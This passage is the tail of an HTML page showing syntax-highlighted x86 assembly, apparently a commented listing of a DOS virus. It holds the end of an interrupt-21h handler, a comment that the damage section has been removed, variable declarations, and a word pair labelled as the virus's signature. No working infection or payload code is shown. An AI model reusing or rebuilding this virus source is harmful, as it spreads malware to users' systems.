</span><span class="sc1">;       The damage section located here has been removed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">NEW21</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">DOSPC</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">DOSSEG</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">COUNTER</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">LEN_LO</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LEN_HI</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ID</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4418H</span><span class="sc4">,</span><span class="sc2">5F19H</span><span class="sc0">             </span><span class="sc1">; The signature of the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       A buffer, used for data from the file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">

        </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">LABEL1</span><span class="sc0">


</span></div></body>
</html>
